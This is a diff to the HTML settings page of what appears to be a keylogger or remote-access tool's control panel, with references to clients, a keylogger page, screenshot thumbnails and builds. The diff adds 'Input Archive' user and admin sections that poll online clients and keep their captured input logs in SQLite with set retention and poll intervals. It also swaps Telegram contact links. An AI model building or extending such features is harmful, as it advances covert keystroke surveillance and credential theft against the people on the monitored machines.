@@ -81,6 +81,7 @@
             <a data-target="section-account"          class="settings-nav-link" style="--accent: 56 189 248"><i class="fa-solid fa-user w-4 text-sky-400"></i><span>Account</span></a>
             <a data-target="section-sessions"         class="settings-nav-link" style="--accent: 52 211 153"><i class="fa-solid fa-desktop w-4 text-emerald-400"></i><span>Active Sessions</span></a>
             <a data-target="section-prefs"            class="settings-nav-link" style="--accent: 167 139 250"><i class="fa-solid fa-sliders w-4 text-violet-400"></i><span>Dashboard Preferences</span></a>
+            <a data-target="input-archive-section"    class="settings-nav-link" style="--accent: 250 204 21"><i class="fa-solid fa-box-archive w-4 text-yellow-400"></i><span>Input Archive</span></a>
             <a data-target="telegram-settings"        class="settings-nav-link" style="--accent: 52 211 153"><i class="fa-solid fa-bell w-4 text-emerald-400"></i><span>Notification Delivery</span></a>
             <a data-target="section-news"             class="settings-nav-link" style="--accent: 56 189 248"><i class="fa-brands fa-telegram w-4 text-sky-400"></i><span>News &amp; Updates</span></a>
 
@@ -96,6 +97,7 @@
             <a data-target="chat-settings-section"    class="settings-nav-link" data-permission="system:chat" style="--accent: 56 189 248"><i class="fa-solid fa-comments w-4 text-sky-400"></i><span>Team Chat</span></a>
             <a data-target="registration-section"     class="settings-nav-link" data-permission="system:registration" style="--accent: 52 211 153"><i class="fa-solid fa-user-plus w-4 text-emerald-400"></i><span>Registration</span></a>
             <a data-target="thumbnails-section"       class="settings-nav-link" data-permission="system:thumbnails" style="--accent: 56 189 248"><i class="fa-solid fa-images w-4 text-sky-400"></i><span>Screenshot Thumbnails</span></a>
+            <a data-target="input-archive-admin-section" class="settings-nav-link" data-permission="system:input-archive" style="--accent: 250 204 21"><i class="fa-solid fa-database w-4 text-yellow-400"></i><span>Input Archive Admin</span></a>
             <a data-target="build-rate-limit-section" class="settings-nav-link" data-permission="system:build-limits" style="--accent: 251 146 60"><i class="fa-solid fa-gauge-high w-4 text-orange-400"></i><span>Build Rate Limit</span></a>
             <a data-target="section-appearance"       class="settings-nav-link" data-permission="system:appearance" style="--accent: 232 121 249"><i class="fa-solid fa-paintbrush w-4 text-fuchsia-400"></i><span>Custom CSS</span></a>
             <a data-target="export-import-section"    class="settings-nav-link" data-permission="system:export-import" style="--accent: 251 191 36"><i class="fa-solid fa-file-export w-4 text-amber-400"></i><span>Export / Import</span></a>
@@ -372,6 +374,33 @@
         </form>
       </section>
 
+      <!-- Input Archive -->
+      <section id="input-archive-section" class="bg-slate-900/60 border border-slate-800 rounded-xl p-5 space-y-4 settings-section">
+        <div class="flex items-center gap-3">
+          <div class="flex items-center justify-center w-9 h-9 rounded-lg bg-yellow-500/10 border border-yellow-500/30">
+            <i class="fa-solid fa-box-archive text-yellow-400"></i>
+          </div>
+          <div>
+            <h2 class="text-lg font-semibold">Input Archive</h2>
+            <p class="text-sm text-slate-400">Opt in to server-side retrieval for clients you can access.</p>
+          </div>
+        </div>
+
+        <form id="input-archive-user-form" class="space-y-4">
+          <label class="flex items-start gap-3 p-3 rounded-lg border border-slate-700/60 bg-slate-900/40 hover:bg-slate-900/70 cursor-pointer transition-colors">
+            <input id="input-archive-my-enabled" type="checkbox" class="mt-1 h-4 w-4 accent-yellow-500" />
+            <div>
+              <div class="text-sm font-medium text-slate-100">Auto retrieve input logs for my accessible clients</div>
+              <div class="text-xs text-slate-400">When the global archive is enabled, online clients are polled and stored in SQLite so the keylogger page can search archived logs while a client is offline.</div>
+            </div>
+          </label>
+
+          <button type="submit" class="inline-flex items-center gap-2 px-4 py-2 rounded-lg bg-yellow-700 hover:bg-yellow-600 transition-colors text-white text-sm font-medium">
+            <i class="fa-solid fa-floppy-disk"></i>Save Preference
+          </button>
+        </form>
+      </section>
+
       <!-- Notification Delivery -->
       <section id="telegram-settings" class="bg-slate-900/60 border border-slate-800 rounded-xl p-5 space-y-4 settings-section">
         <div class="flex items-center gap-3">
@@ -411,7 +440,7 @@
             <p class="text-xs text-slate-500 mt-1">Channel: <span class="text-slate-400 font-mono">@kunta</span></p>
           </div>
           <a
-            href="https://t.me/kunta"
+            href="https://t.me/KTicketsBot"
             target="_blank"
             rel="noopener noreferrer"
             class="inline-flex items-center gap-2 px-4 py-2 rounded-lg bg-sky-600 hover:bg-sky-500 transition-colors text-white text-sm font-medium whitespace-nowrap"
@@ -983,6 +1012,48 @@
         <p id="thumbnails-msg" class="hidden text-sm rounded-lg px-3 py-2 border"></p>
       </section>
 
+      <!-- Input Archive Admin -->
+      <section id="input-archive-admin-section" data-permission="system:input-archive" class="hidden bg-slate-900/60 border border-slate-800 rounded-xl p-5 space-y-4 settings-section">
+        <div class="flex items-center gap-3">
+          <div class="flex items-center justify-center w-9 h-9 rounded-lg bg-yellow-500/10 border border-yellow-500/30">
+            <i class="fa-solid fa-database text-yellow-400"></i>
+          </div>
+          <div>
+            <h2 class="text-lg font-semibold">Input Archive Admin</h2>
+            <p class="text-sm text-slate-400">Admin-only. Control server-side SQLite retention and retrieval limits.</p>
+          </div>
+        </div>
+
+        <form id="input-archive-admin-form" class="space-y-4">
+          <label class="flex items-start gap-3 p-3 rounded-lg border border-slate-700/60 bg-slate-900/40 hover:bg-slate-900/70 cursor-pointer transition-colors">
+            <input id="input-archive-global-enabled" type="checkbox" class="mt-1 h-4 w-4 accent-yellow-500" />
+            <div>
+              <div class="text-sm font-medium text-slate-100">Enable global input archive</div>
+              <div class="text-xs text-slate-400">Per-user opt-ins only take effect while this global switch is enabled.</div>
+            </div>
+          </label>
+
+          <div class="grid grid-cols-1 sm:grid-cols-3 gap-3">
+            <label class="block">
+              <span class="text-sm text-slate-300">Retention (days)</span>
+              <input id="input-archive-retention-days" type="number" min="1" max="365" step="1" class="mt-1 w-full px-3 py-2 rounded-lg bg-slate-900 border border-slate-700 focus:outline-none focus:ring-2 focus:ring-yellow-500 text-sm" />
+            </label>
+            <label class="block">
+              <span class="text-sm text-slate-300">Max file size (MB)</span>
+              <input id="input-archive-max-file-mb" type="number" min="1" max="50" step="1" class="mt-1 w-full px-3 py-2 rounded-lg bg-slate-900 border border-slate-700 focus:outline-none focus:ring-2 focus:ring-yellow-500 text-sm" />
+            </label>
+            <label class="block">
+              <span class="text-sm text-slate-300">Poll interval (seconds)</span>
+              <input id="input-archive-poll-seconds" type="number" min="0" max="86400" step="30" class="mt-1 w-full px-3 py-2 rounded-lg bg-slate-900 border border-slate-700 focus:outline-none focus:ring-2 focus:ring-yellow-500 text-sm" />
+            </label>
+          </div>
+
+          <button type="submit" class="inline-flex items-center gap-2 px-4 py-2 rounded-lg bg-yellow-700 hover:bg-yellow-600 transition-colors text-white text-sm font-medium">
+            <i class="fa-solid fa-floppy-disk"></i>Save Archive Settings
+          </button>
+        </form>
+      </section>
+
       <!-- Build Rate Limit (admin only) -->
       <section id="build-rate-limit-section" data-permission="system:build-limits" class="hidden bg-slate-900/60 border border-slate-800 rounded-xl p-5 space-y-4 settings-section">
         <div class="flex items-center gap-3">
@@ -1314,7 +1385,7 @@
       <!-- /flex wrapper -->
 
       <footer class="text-center text-sm text-slate-500 py-4 border-t border-slate-800 mt-4">
-        <p>Created by KDot &mdash; <a href="https://t.me/kunta" target="_blank" rel="noopener noreferrer" class="text-sky-400 hover:text-sky-300 transition-colors"><i class="fa-brands fa-telegram"></i> t.me/kunta</a></p>
+        <p>Created by KDot &mdash; <a href="https://t.me/Onimai" target="_blank" rel="noopener noreferrer" class="text-sky-400 hover:text-sky-300 transition-colors"><i class="fa-brands fa-telegram"></i> t.me/Onimai</a></p>
       </footer>
 
     </main>
